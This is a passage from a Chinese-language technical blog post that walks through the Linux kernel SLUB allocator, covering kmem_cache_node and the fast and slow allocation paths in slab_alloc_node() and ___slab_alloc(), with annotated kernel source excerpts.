title="四、kmem_cache_node：各 node 后备内存池"></a>四、kmem_cache_node：各 node 后备内存池</h2><p><strong>每个 <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> 对应的后备内存池</strong>，当 percpu 的独占内存池耗尽后便会从对应 node 的后备内存池尝试分配</p><blockquote><p>不过大部分计算机都仅有一个 node，所以通常情况下每个 <code>kmem_cache</code> 也就只有一个 <code>kmem_cache_node</code>  😄</p></blockquote><p>因为本文主要讲 slub，所以仅截取 slub 相关字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>：保护 partial 和 full 链表的锁</li><li><code>partial</code>：partial slab 链表，连接<strong>有着部分空闲对象剩余的 slab</strong></li><li><code>nr_partial</code>：partial slab 的数量</li><li><code>full</code>：full slab 链表，连接<strong>空闲对象完全耗尽的 slab</strong>（注：该链表基本上不常用）</li><li><code>nr_slabs</code>：总的 slab 数量</li><li><code>total_objects</code>：总的对象数量</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1 id="0x02-对象的分配"><a href="#0x02-对象的分配" class="headerlink" title="0x02. 对象的分配"></a>0x02. 对象的分配</h1><h2 id="※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object"><a href="#※-一、slab-alloc-node-：从指定的-kmem-cache-分配-object" class="headerlink" title="※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object"></a>※ 一、slab_alloc_node()：从指定的 kmem_cache 分配 object</h2><p>在 slab allocator 中存在着多个不同的内存分配接口，其最后都会调用到 <code>slab_alloc_node()</code> 完成内存分配的工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 内联化的快速路径以让分配函数 (kmalloc, kmem_cache_alloc) 中包含快速路径.</span><br><span class="hljs-comment"> * 因此，对于快速路径可以满足的请求，没有函数调用的开销.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 快速路径首先检查无锁的空闲链表是否可以被使用.</span><br><span class="hljs-comment"> * 若否，调用 __slab_alloc 进行缓慢处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则我们可以简单地从无锁空闲链表取出下一个对象.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>该函数首先会调用 <code>slab_pre_alloc_hook()</code> 进行分配前的检查工作，不通过则返回 NULL，这一步主要是检查分配标志位是否合法等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>接下来调用 <code>kfence_alloc()</code> 进行内存错误检测，不通过则直接跳转到 <code>out</code>，这里用到了 <em>Kfence (Kernel Electric Fence)</em>  内存纠错机制，主要是检查对 <code>data page</code> 的访问是否越界：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>接下来调用 <code>__slab_alloc_node()</code> 进行正式的内存分配，这一步便是真正的核心分配函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>最后调用 <code>maybe_wipe_obj_freeptr()</code> 将 object 原本存放 next free object 指针的位置清零，之后调用 <code>slab_want_init_on_alloc()</code> 检查标志位是否有 <code>__GFP_ZERO</code>，若有则调用 <code>slab_post_alloc_hook()</code> 将 object 上数据清零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当 init == &#x27;true&#x27;, 类似 kzalloc() 族, </span><br><span class="hljs-comment"> * 仅有 @orig_size 字节会被清零，而非 s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看真正的核心分配函数 <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）"><a href="#I-slab-alloc-node-：从-percpu-freelist-进行分配（fast-path）" class="headerlink" title="I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）"></a>I. __slab_alloc_node()：从 percpu freelist 进行分配（fast path）</h3><p>该函数首先会先获取 percpu 的 <code>kmem_cache_cpu</code> 上的 freelist 与 slab，<strong>若 slab 或 freelist 为空</strong> &#x2F; slab 与 node 不匹配，则调用 <code>__slab_alloc()</code> 分配一张新 slab 并从其中获取一个空闲对象：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 必须通过该 cpu ptr 读取 kmem_cache cpu 数据. 抢占是开启的.</span><br><span class="hljs-comment"> * 我们可能会在从一个 cpu 区域读取时在 cpu 间切换.</span><br><span class="hljs-comment"> * 只要我们在 cmpxchg 时在原本的 cpu 上重新结束便不要紧.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们必须保证 tid 与 kmem_cache_cpu 被在同一 cpu 上取回.</span><br><span class="hljs-comment"> * 我们首先读取 kmem_cache_cpu 指针并用其读取 tid.</span><br><span class="hljs-comment"> * 若我们在两次读取间被抢占并切换到另一 cpu，由于这两者仍与同一 cpu 关联，</span><br><span class="hljs-comment"> * cmpxchg 稍后将会验证 cpu ，这是 OK 的.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 此处使用的无中断（irqless） 对象分配/释放算法决定于获取 cpu_slab 数据的顺序.</span><br><span class="hljs-comment"> * tid 应当在在 c 上的任何事之前被获取以确保与此前 tid 关联的对象与 slab</span><br><span class="hljs-comment"> * 不会被与当前 tid 一起使用. 若我们先获取 tid，对象与 slab 可能会与下一个 tid </span><br><span class="hljs-comment"> * 相关联，而我们的分配/释放请求也将会失败.这种情况下我们会重试所以没问题.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queue（这句翻成中文咋都不顺，直接看原文吧😄）.</span><br><span class="hljs-comment"> * 由此可以确保 cmpxchg_double 发生在正确的处理器上且其间在链表上没有任何操作.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>若有 freelist &amp; slub，则<strong>调用 <code>get_freepointer_safe()</code> 获取当前空闲对象下一个空闲对象</strong>；接下来 <code>this_cpu_cmpxchg_double()</code> 会检查是否 <code>freelist == object</code>、<code>cpu_slab-&gt;tid == tid</code>，若是则<strong>将 freelist 设为 next_object 并获取设置下一 tid</strong>，否则说明发生了抢占（我们已经不在原 cpu 上了），跳转回 <code>redo</code> 重新在当前 cpu 上进行分配：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 仅当没有额外操作且我们在正确的处理器上时 cmpxchg 将匹配.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg 原子地进行了如下： (没有锁语义!)</span><br><span class="hljs-comment"> * 1. 重定位第一个指针到当前的 per cpu 区域.</span><br><span class="hljs-comment"> * 2. 验证 tid &amp; freelist 没有被改变</span><br><span class="hljs-comment"> * 3. 若未被改变，替换 tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 自从没有锁语义，保护仅需要对抗在该 cpu 上执行的代码*不*从其他的 cpu 上访问.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后对于直接从 cpu_slab 上分配的对象会通过 <code>prefetch_freepointer()</code> 调用 prefetchw 指令提前将已分配对象的地址载入缓存中，之后就是返回分配成功的空闲对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-：获取另一-slab-进行分配（slow-path）"><a href="#II-slab-alloc-：获取另一-slab-进行分配（slow-path）" class="headerlink" title="II. ___slab_alloc()：获取另一 slab 进行分配（slow path）"></a>II. ___slab_alloc()：获取另一 slab 进行分配（slow path）</h3><p><code>__slab_alloc()</code> 其实是在开启了抢占的情况下（默认开启）对 <code>___slab_alloc()</code> 的一个简单的 wrapper，主要就是重新读取 <code>kmem_cache_cpu</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 当抢占没有关闭时 ___slab_alloc() 用于上下文的 wrapper.</span><br><span class="hljs-comment"> * 通过重新获取 percpu 区域的指针来补偿可能的 cpu 更改.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们可能已被抢占且在关闭抢占前调度到了不同的 cpu 上.</span><br><span class="hljs-comment"> * 需要重新载入 cpu 区域指针.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们来看 <code>___slab_alloc()</code>，该函数便是慢速分配路径的核心函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢速路径. 无锁 freelist 为空或是我们需要进行调试任务.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若新的对象已经被释放到常规的 freelist 上，则过程仍是很快的.</span><br><span class="hljs-comment"> * 这种情况下我们简单地让常规的 freelist 取代无锁 freelist</span><br><span class="hljs-comment"> * 并 zap the regular freelist.（zap想不出咋翻译好😄）</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若这不起作用，则我们回退到 partial 链表. 我们将 freelist 上的第一个元素</span><br><span class="hljs-comment"> * 作为要分配的对象并将 freelist 的剩余部分移动到无锁 freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若我们无法从 partial slab 链表上获得一个新的 slab，我们需要分配一个新的 slab.</span><br><span class="hljs-comment"> * 因为这包含对页分配器的调用与新 slab 的设置，这是最慢的路径.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当我们知道抢占被禁用时所用的 __slab_alloc 的版本 (也是造成大量分配的原因).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">partial_context</span> <span class="hljs-title">pc</span>;</span><br><br>stat(s, ALLOC_SLOWPATH);<br></code></pre></td></tr></table></figure><p>接下来笔者按照代码标签顺序进行分析</p><h4 id="①-reread-slab：读取-percpu-slab"><a href="#①-reread-slab：读取-percpu-slab" class="headerlink" title="① reread_slab：读取 percpu slab"></a>① reread_slab：读取 percpu slab</h4><p>首先读取 percpu 的 slab，若没有 slab 则判断分配节点，并跳转到 <code>new_slab</code> 分配新的 slab，注意这一块代码对应 <code>reread_slab</code> 标签：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">reread_slab:<br><br>slab = READ_ONCE(c-&gt;slab);<br><span class="hljs-keyword">if</span> (!slab) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若 node 未上线或没有 normal memory，忽略 node 约束</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;<br>     !node_isset(node, slab_nodes)))<br>node = NUMA_NO_NODE;<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="②-redo：获取-percpu-slab-gt-freelist"><a href="#②-redo：获取-percpu-slab-gt-freelist" class="headerlink" title="② redo：获取 percpu slab-&gt;freelist"></a>② redo：获取 percpu slab-&gt;freelist</h4><p>接下来这块代码对应 <code>redo</code> 标签：</p><ul><li><p>若 percpu slab 不为空，判断 slab 是否属于指定的节点且与分配标志位匹配，若否，则跳转到 <code>deactivate_slab</code> 标签</p></li><li><p>接下来检查 slab 是否仍为原来的 cpu slab（因为我们可能被抢占），若否，则跳转回 <code>reread_slab</code></p></li><li><p>接下来获取 per-cpu 的 freelist，若不为空，则跳转到 <code>load_freelist</code>，否则<strong>调用 <code>get_freelist()</code> 获取 slab 的 freelist</strong></p></li><li><p>若 slab 的 freelist 仍为空，将 per-cpu freelist 设为 NULL，获取下一个 tid，并跳转到 <code>new_slab</code> 分配新的 slab</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><br><span class="hljs-keyword">if</span> (unlikely(!node_match(slab, node))) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 与上面相同但 node_match() 为 false 则早已说明 node != NUMA_NO_NODE</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!node_isset(node, slab_nodes)) &#123;<br>node = NUMA_NO_NODE;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>stat(s, ALLOC_NODE_MISMATCH);<br><span class="hljs-keyword">goto</span> deactivate_slab;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们理应搜索一个 PFMEMALLOC 的 slab 页面，但现在，</span><br><span class="hljs-comment"> * 当页面离开 per-cpu 分配器，我们正在失去 pfmemalloc 信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags)))<br><span class="hljs-keyword">goto</span> deactivate_slab;<br><br><span class="hljs-comment">/* 必须再次检查 c-&gt;slab 以免我们被抢占使其发生了更改 */</span><br>local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br><span class="hljs-keyword">goto</span> reread_slab;<br>&#125;<br>freelist = c-&gt;freelist;<br><span class="hljs-keyword">if</span> (freelist)<br><span class="hljs-keyword">goto</span> load_freelist;<br><br>freelist = get_freelist(s, slab);<br><br><span class="hljs-keyword">if</span> (!freelist) &#123;<br>c-&gt;slab = <span class="hljs-literal">NULL</span>;<br>c-&gt;tid = next_tid(c-&gt;tid);<br>local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);<br>stat(s, DEACTIVATE_BYPASS);<br><span class="hljs-keyword">goto</span> new_slab;<br>&#125;<br><br>stat(s, ALLOC_REFILL);<br></code></pre></td></tr></table></figure><p><code>get_freelist()</code> 函数主要就是获取 <code>slab-&gt;freelist</code> 后将 <code>slab-&gt;freelist</code> 设为 NULL 并返回原来的 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 检查 slab-&gt;freelist 并将 freelist 传送给 percpu freelist</span><br><span class="hljs-comment"> * 或是将 slab 给 deactivate.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若返回值非 NULL 则 slab 仍被冻结.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若该函数返回 NULL 则 slab 被解冻.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">get_freelist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-type">void</span> *freelist;<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-keyword">do</span> &#123;<br>freelist = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br><br>new.counters = counters;<br>VM_BUG_ON(!new.frozen);<br><br>new.inuse = slab-&gt;objects;<br>new.frozen = freelist != <span class="hljs-literal">NULL</span>;<br><br>&#125; <span class="hljs-keyword">while</span> (!__cmpxchg_double_slab(s, slab,<br>freelist, counters,<br><span class="hljs-literal">NULL</span>, new.counters,<br><span class="hljs-string">&quot;get_freelist&quot;</span>));<br><br><span class="hljs-keyword">return</span> freelist;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="③-load-freelist：从-freelist-分配对象"><a href="#③-load-freelist：从-freelist-分配对象" class="headerlink" title="③ load_freelist：从 freelist 分配对象"></a>③ load_freelist：从 freelist 分配对象</h4><p>继续返回 <code>___slab_alloc()</code> 中，接下来这块代码对应 <code>load_freelist</code> 标签，主要就是调用 <code>get_freepointer()</code> 将 percpu freelist 指向第二个空闲对象，并获取下一个 tid 后返回前面获取的 freelist（也就是第一个空闲对象）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">load_freelist:<br><br>lockdep_assert_held(this_cpu_ptr(&amp;s-&gt;cpu_slab-&gt;lock));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * freelist 指向要被使用的对象链表. slab 指向获得对象的 slab.</span><br><span class="hljs-comment"> * 因此 slab 必须被冻结以让 percpu 的分配正常工作.</span><br><span 